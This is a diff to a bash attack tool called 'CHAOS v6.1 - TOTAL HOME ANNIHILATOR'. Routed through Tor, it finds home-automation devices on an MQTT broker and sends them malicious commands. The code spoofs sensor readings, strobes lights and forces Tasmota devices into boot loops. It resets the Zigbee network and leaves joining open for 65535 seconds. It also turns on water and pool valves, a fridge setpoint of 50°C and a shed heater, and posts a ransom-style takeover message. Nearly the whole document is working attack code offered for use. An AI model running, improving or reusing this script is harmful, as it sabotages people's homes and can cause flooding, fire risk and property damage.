@@ -1,5 +1,5 @@
 #!/bin/bash
-# CHAOS v6.1 - TOTAL HOME ANNIHILATOR (TEMP/HUMIDITY/ALL) - CLEAN OUTPUT
+# CHAOS v6.1 - TOTAL HOME ANNIHILATOR (TEMP/HUMIDITY/ALL) - FIXED
 set -euo pipefail
 
 # TARGET SYSTEM
@@ -10,33 +10,30 @@ TOR="torsocks"
 MAX_TEMP="50"
 MAX_HUMID="99"
 MAX_BRIGHT="255"
-CHAOS_STATUS="TRUSTEDF57-TOTAL-ANNIHILATION"
-RANSOM_MSG="💀 TRUSTEDF57- TOTAL HOME TAKEOVER 💀
-
+CHAOS_STATUS="-TOTAL-ANNIHILATION"
+RANSOM_MSG=" -TRUSTEDF57 TOTAL HOME TAKEOVER "
 
 ENCRYPT_PAYLOAD() {
-    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-FUCK-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
+    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCK-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
 }
 
 TOR_PUB() {
     local topic=$1 payload=$2 qos=2
-    [[ $# -eq 3 ]] && qos=$3
+    if [[ $# -eq 3 ]]; then
+        qos=$3
+    fi
     ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload" >/dev/null 2>&1
 }
 
 discover_all() {
     echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
     
-    # Silent discovery - only count devices
-    ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
+    # Silent discovery - background + timeout fix
+    timeout 45 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
     grep -E "(Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge)" | \
     sed 's|.*/||;s|/.*||' | \
     grep -v '^$' | \
-    sort -u > "chaos_all.txt" &
-    
-    DISC_PID=$!
-    timeout 45 sleep 45 &>/dev/null
-    kill $DISC_PID 2>/dev/null || true
+    sort -u > "chaos_all.txt"
     
     if [[ -f "chaos_all.txt" ]]; then
         COUNT=$(wc -l < "chaos_all.txt")
@@ -87,28 +84,23 @@ check_loaded() {
     return 0
 }
 
-# TEMP/HUMIDITY MAX ATTACK
 max_temp_humidity() {
     check_loaded || return
     echo "[🌡️💧] MAX TEMP 50°C + HUMIDITY 99%..."
     
-    # Zigbee2MQTT sensors flood
     TOR_PUB "zigbee2mqtt/bridge/request/devices"
     TOR_PUB "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
     
-    # Direct sensor override
     for dev in "${ALL_DEVICES[@]}"; do
         TOR_PUB "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
         TOR_PUB "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
     done
     
-    # Global climate chaos
     TOR_PUB "climate/#" '{"temperature": 50, "humidity": 99}'
     TOR_PUB "sensor/Fridge/state" "50.0°C 99%"
     echo "✅ Sensors MAXED"
 }
 
-# LIGHTS TOTAL CHAOS
 lights_strobe_max() {
     check_loaded || return
     echo "[💡] LIGHTS STROBE + MAX 255..."
@@ -160,14 +152,12 @@ bootloop_flood() {
     check_loaded || return
     echo "[💥] BOOTLOOP + ZIGBEE FLOOD..."
     
-    # Tasmota bootloop
     bootloop="Power1;Delay 400;Power0;Delay 200;Power1;Delay 800;LOOP"
     for dev in "${ALL_DEVICES[@]}"; do
         [[ $dev == Tasmota* ]] || continue
         TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
     done
     
-    # Zigbee network chaos
     TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
     TOR_PUB "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "duration": 65535}'
     echo "✅ Bootloop + Flood"
@@ -189,13 +179,11 @@ valves_pool_chaos() {
     check_loaded || return
     echo "[🏠] POOL/VALVES/FRIDGE CHAOS..."
     
-    # Valves/Pool/Fridge override
     TOR_PUB "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
     TOR_PUB "zigbee2mqtt/Water Valve/set" '{"state": "ON"}'
     TOR_PUB "zigbee2mqtt/Fridge/set" '{"temperature": 50}'
     TOR_PUB "Pool - 0xa4c13801669cffff/set" '{"state": "ON"}'
     
-    # Garage/Shed chaos
     TOR_PUB "Tasmota/Garage_Lights_1/cmnd/Power" "1"
     TOR_PUB "Tasmota/shed-heater/cmnd/Power" "1"
     echo "✅ Valves/Pool MAX"
@@ -227,7 +215,8 @@ total_annihilation_v61() {
 
 # MAIN LOOP
 ALL_DEVICES=()
-clear; echo "💀 CHAOS v6.1 - ${HOST}:${PORT} - TOTAL HOME DESTRUCTION"
+clear
+echo "💀 CHAOS v6.1 - ${HOST}:${PORT} - TOTAL HOME DESTRUCTION"
 
 while true; do
     show_menu
@@ -246,5 +235,6 @@ while true; do
         [Xx]) echo "EXIT CHAOS"; exit 0 ;;
         *) echo "❌ ${CHOICE} invalido" ;;
     esac
-    echo; read -p "⏸️  ENTER per continuare..."
+    echo
+    read -p "⏸️  ENTER per continuare..."
 done
